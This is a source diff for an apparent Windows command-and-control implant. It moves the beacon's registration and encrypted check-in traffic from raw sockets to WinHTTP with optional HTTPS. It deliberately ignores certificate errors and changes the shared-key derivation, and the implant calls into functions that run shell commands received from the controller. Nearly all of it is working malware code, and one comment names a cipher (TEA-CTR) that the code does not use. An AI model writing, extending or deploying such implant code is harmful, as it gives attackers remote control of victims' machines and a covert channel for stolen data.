@@ -1,6 +1,5 @@
-#include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
+#include <winhttp.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -52,7 +51,7 @@ static uint8_t *chacha20poly1305_encrypt(const uint8_t *plaintext, size_t plain_
     uint8_t *result = NULL;
     
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0))) {
-        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed\n");
+        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed (ChaCha20-Poly1305 requires Windows 10 1709+?)\n");
         goto cleanup;
     }
 
@@ -123,7 +122,7 @@ static uint8_t *chacha20poly1305_decrypt(const uint8_t *encrypted, size_t enc_le
     }
 
     if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_CHACHA20_POLY1305_ALGORITHM, NULL, 0))) {
-        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed\n");
+        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider failed (ChaCha20-Poly1305 requires Windows 10 1709+?)\n");
         goto cleanup;
     }
 
@@ -324,12 +323,6 @@ static int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPee
         goto cleanup;
     }
 
-    for (ULONG i = 0; i < raw_len / 2; i++) {
-      uint8_t tmp = raw[i];
-      raw[i] = raw[raw_len - 1 - i];
-      raw[raw_len - 1 - i] = tmp;
-    }
-
     // KDF: SESSION_KEY = SHA-256(shared_secret)[:32] for ChaCha20-Poly1305
     uint8_t hash[32];
     if (bcrypt_sha256(raw, raw_len, hash) == 0) {
@@ -379,80 +372,139 @@ void beacon_log(const char *fmt, ...) {
 }
 
 // ---------------------------------------------------------------------------
-// Raw HTTP POST — plaintext, used only for the /register handshake
+// WinHTTP wrapper for HTTP(S) POST requests.
 // ---------------------------------------------------------------------------
-static int http_post_raw(const char *host, int port, const char *path,
-                         const uint8_t *body, int body_len,
-                         uint8_t **out_body, int *out_body_len) {
-    SOCKET  sockfd = INVALID_SOCKET;
-    struct  sockaddr_in addr;
-    char    hdr[512];
-    uint8_t *resp  = NULL;
-    int     total  = 0, bytes, ret = -1;
+static int http_post_winhttp(const char *host, int port, const char *path,
+                             const uint8_t *body, int body_len,
+                             uint8_t **out_body, int *out_body_len) {
+    HINTERNET hSession = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
+    char      headers[512] = {0};
+    uint8_t  *resp = NULL;
+    int       ret = -1;
+    DWORD     bytes_available = 0;
+    DWORD     bytes_read = 0;
+    int       total = 0;
+    DWORD     flags = 0;
+    wchar_t   wide_host[PATH_BUF_SIZE] = {0};
+    wchar_t   wide_path[PATH_BUF_SIZE] = {0};
+    wchar_t   wide_agent[PATH_BUF_SIZE] = {0};
+    wchar_t   wide_headers[512] = {0};
 
-    *out_body     = NULL;
+    *out_body = NULL;
     *out_body_len = 0;
 
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd == INVALID_SOCKET) goto cleanup;
-
-    addr.sin_family = AF_INET;
-    addr.sin_port   = htons((u_short)port);
-    inet_pton(AF_INET, host, &addr.sin_addr);
-    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) goto cleanup;
+#if C2_USE_HTTPS
+    flags = WINHTTP_FLAG_SECURE;
+#endif
 
     const char *auth_token = C2_AUTH_TOKEN;
     if (auth_token[0] != '\0') {
-        snprintf(hdr, sizeof(hdr),
-            "POST %s HTTP/1.1\r\n"
-            "Host: %s:%d\r\n"
-            "User-Agent: %s\r\n"
-            "X-C2-Token: %s\r\n"
-            "Content-Type: application/octet-stream\r\n"
-            "Content-Length: %d\r\n"
-            "Connection: close\r\n\r\n",
-            path, host, port, USER_AGENT, auth_token, body_len);
+        snprintf(headers, sizeof(headers),
+                 "Host: %s:%d\r\n"
+                 "User-Agent: %s\r\n"
+                 "X-C2-Token: %s\r\n"
+                 "Content-Type: application/octet-stream\r\n"
+                 "Connection: close\r\n",
+                 host, port, USER_AGENT, auth_token);
     } else {
-        snprintf(hdr, sizeof(hdr),
-            "POST %s HTTP/1.1\r\n"
-            "Host: %s:%d\r\n"
-            "User-Agent: %s\r\n"
-            "Content-Type: application/octet-stream\r\n"
-            "Content-Length: %d\r\n"
-            "Connection: close\r\n\r\n",
-            path, host, port, USER_AGENT, body_len);
+        snprintf(headers, sizeof(headers),
+                 "Host: %s:%d\r\n"
+                 "User-Agent: %s\r\n"
+                 "Content-Type: application/octet-stream\r\n"
+                 "Connection: close\r\n",
+                 host, port, USER_AGENT);
     }
 
-    if (send(sockfd, hdr,           (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
-    if (send(sockfd, (const char *)body, body_len,    0) == SOCKET_ERROR) goto cleanup;
+    if (!MultiByteToWideChar(CP_UTF8, 0, host, -1, wide_host, PATH_BUF_SIZE))
+        goto cleanup;
+    if (!MultiByteToWideChar(CP_UTF8, 0, path, -1, wide_path, PATH_BUF_SIZE))
+        goto cleanup;
+    if (!MultiByteToWideChar(CP_UTF8, 0, USER_AGENT, -1, wide_agent, PATH_BUF_SIZE))
+        goto cleanup;
+    if (!MultiByteToWideChar(CP_UTF8, 0, headers, -1, wide_headers, 512))
+        goto cleanup;
+
+    hSession = WinHttpOpen(wide_agent,
+                           WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+                           WINHTTP_NO_PROXY_NAME,
+                           WINHTTP_NO_PROXY_BYPASS,
+                           0);
+    if (!hSession) goto cleanup;
+
+    hConnect = WinHttpConnect(hSession, wide_host, port, 0);
+    if (!hConnect) goto cleanup;
+
+    hRequest = WinHttpOpenRequest(hConnect,
+                                  L"POST",
+                                  wide_path,
+                                  NULL,
+                                  WINHTTP_NO_REFERER,
+                                  WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                  flags);
+    if (!hRequest) goto cleanup;
+
+#if C2_USE_HTTPS
+    {
+        DWORD security_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                               SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                               SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+        WinHttpSetOption(hRequest,
+                         WINHTTP_OPTION_SECURITY_FLAGS,
+                         &security_flags,
+                         sizeof(security_flags));
+    }
+#endif
+
+    if (!WinHttpAddRequestHeaders(hRequest, wide_headers, -1L, WINHTTP_ADDREQ_FLAG_ADD))
+        goto cleanup;
+
+    if (!WinHttpSendRequest(hRequest,
+                            WINHTTP_NO_ADDITIONAL_HEADERS,
+                            0,
+                            (LPVOID)body,
+                            body_len,
+                            body_len,
+                            0))
+        goto cleanup;
+
+    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;
 
     resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
     if (!resp) goto cleanup;
 
-    while (total < HTTP_BUF_SIZE - 1) {
-        bytes = recv(sockfd, (char *)resp + total, HTTP_BUF_SIZE - total - 1, 0);
-        if (bytes <= 0) break;
-        total += bytes;
+    while (WinHttpQueryDataAvailable(hRequest, &bytes_available) &&
+           bytes_available > 0 &&
+           total < HTTP_BUF_SIZE - 1) {
+        if (bytes_available > (DWORD)(HTTP_BUF_SIZE - 1 - total))
+            bytes_available = HTTP_BUF_SIZE - 1 - total;
+
+        if (!WinHttpReadData(hRequest, resp + total, bytes_available, &bytes_read))
+            goto cleanup;
+        if (bytes_read == 0) break;
+        total += (int)bytes_read;
     }
-    resp[total] = '\0';
 
-    char *body_start = strstr((char *)resp, "\r\n\r\n");
-    if (!body_start) goto cleanup;
-    body_start += 4;
+    if (total <= 0) goto cleanup;
 
-    int blen    = total - (int)(body_start - (char *)resp);
-    uint8_t *out = (uint8_t *)malloc(blen + 1);
-    if (!out) goto cleanup;
-    memcpy(out, body_start, blen);
-    out[blen]     = '\0';
-    *out_body     = out;
-    *out_body_len = blen;
+    *out_body = resp;
+    *out_body_len = total;
+    resp = NULL;
     ret = 0;
 
 cleanup:
-    if (sockfd != INVALID_SOCKET) closesocket(sockfd);
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
     free(resp);
     return ret;
+}
+
+static int http_post_raw(const char *host, int port, const char *path,
+                         const uint8_t *body, int body_len,
+                         uint8_t **out_body, int *out_body_len) {
+    return http_post_winhttp(host, port, path, body, body_len, out_body, out_body_len);
 }
 
 // ---------------------------------------------------------------------------
@@ -462,81 +514,34 @@ cleanup:
 static int http_post_encrypted(const char *host, int port, const char *path,
                                 const uint8_t *plain_data, int plain_len,
                                 uint8_t **out_plain, int *out_plain_len) {
-    SOCKET   sockfd    = INVALID_SOCKET;
-    struct   sockaddr_in addr;
-    char     hdr[512];
-    uint8_t *enc_body  = NULL;
-    uint8_t *resp      = NULL;
-    int      total     = 0, bytes, ret = -1;
-    size_t   enc_len   = 0;
+    uint8_t *enc_body = NULL;
+    uint8_t *resp = NULL;
+    size_t  enc_len = 0;
+    int     raw_resp_len = 0;
+    int     ret = -1;
+    uint8_t empty_body[1] = {0};
+    const uint8_t *payload = plain_data ? plain_data : empty_body;
 
-    *out_plain     = NULL;
+    *out_plain = NULL;
     *out_plain_len = 0;
 
-    // Encrypt plaintext with ChaCha20-Poly1305: returns [nonce||ciphertext||tag]
-    enc_body = chacha20poly1305_encrypt(plain_data, plain_len, &enc_len);
+    enc_body = chacha20poly1305_encrypt(payload, plain_len, &enc_len);
     if (!enc_body) goto cleanup;
 
-    // Connect
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (sockfd == INVALID_SOCKET) goto cleanup;
-    addr.sin_family = AF_INET;
-    addr.sin_port   = htons((u_short)port);
-    inet_pton(AF_INET, host, &addr.sin_addr);
-    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) goto cleanup;
+    if (http_post_winhttp(host, port, path, enc_body, (int)enc_len, &resp, &raw_resp_len) != 0)
+        goto cleanup;
 
-    const char *auth_token = C2_AUTH_TOKEN;
-    if (auth_token[0] != '\0') {
-        snprintf(hdr, sizeof(hdr),
-            "POST %s HTTP/1.1\r\n"
-            "Host: %s:%d\r\n"
-            "User-Agent: %s\r\n"
-            "X-C2-Token: %s\r\n"
-            "Content-Type: application/octet-stream\r\n"
-            "Content-Length: %zu\r\n"
-            "Connection: close\r\n\r\n",
-            path, host, port, USER_AGENT, auth_token, enc_len);
-    } else {
-        snprintf(hdr, sizeof(hdr),
-            "POST %s HTTP/1.1\r\n"
-            "Host: %s:%d\r\n"
-            "User-Agent: %s\r\n"
-            "Content-Type: application/octet-stream\r\n"
-            "Content-Length: %zu\r\n"
-            "Connection: close\r\n\r\n",
-            path, host, port, USER_AGENT, enc_len);
-    }
+    if (!resp || raw_resp_len < 12 + 16) goto cleanup;
 
-    if (send(sockfd, hdr,                (int)strlen(hdr), 0) == SOCKET_ERROR) goto cleanup;
-    if (send(sockfd, (const char *)enc_body, (int)enc_len,    0) == SOCKET_ERROR) goto cleanup;
-
-    resp = (uint8_t *)malloc(HTTP_BUF_SIZE);
-    if (!resp) goto cleanup;
-    while (total < HTTP_BUF_SIZE - 1) {
-        bytes = recv(sockfd, (char *)resp + total, HTTP_BUF_SIZE - total - 1, 0);
-        if (bytes <= 0) break;
-        total += bytes;
-    }
-    resp[total] = '\0';
-
-    // Extract and decrypt body
-    char *body = strstr((char *)resp, "\r\n\r\n");
-    if (!body) goto cleanup;
-    body += 4;
-    int body_len = total - (int)(body - (char *)resp);
-    if (body_len < 12 + 16) goto cleanup;  // minimum: nonce (12) + tag (16)
-
-    // Decrypt response using ChaCha20-Poly1305
     size_t decrypted_len = 0;
-    uint8_t *plain = chacha20poly1305_decrypt((uint8_t *)body, body_len, &decrypted_len);
+    uint8_t *plain = chacha20poly1305_decrypt(resp, raw_resp_len, &decrypted_len);
     if (!plain) goto cleanup;
 
-    *out_plain     = plain;
+    *out_plain = plain;
     *out_plain_len = (int)decrypted_len;
     ret = 0;
 
 cleanup:
-    if (sockfd != INVALID_SOCKET) closesocket(sockfd);
     free(enc_body);
     free(resp);
     return ret;
@@ -718,20 +723,18 @@ void execute_shell_command(const char *command) {
 // main
 // ---------------------------------------------------------------------------
 int main(void) {
-    WSADATA wsa;
-    char    agent_id[AGENT_ID_SIZE] = {0};
+    char agent_id[AGENT_ID_SIZE] = {0};
 
     srand((unsigned int)GetTickCount());
     beacon_buf     = calloc(OUTPUT_BUF_SIZE, 1);
     beacon_buf_cap = OUTPUT_BUF_SIZE;
     if (!beacon_buf) return 1;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { free(beacon_buf); return 1; }
     GetCurrentDirectoryA(MAX_PATH, cwd);
 
     // ECDH key exchange + registration (plaintext round-trip)
     if (do_register(agent_id) != 0) {
         fprintf(stderr, "[!] Registration failed\n");
-        WSACleanup(); free(beacon_buf); return 1;
+        free(beacon_buf); return 1;
     }
 
     // Initial checkin (now TEA-CTR encrypted with SESSION_KEY)
@@ -798,7 +801,6 @@ int main(void) {
         Sleep(sleep_ms);
     }
 
-    WSACleanup();
     free(beacon_buf);
     return 0;
 }
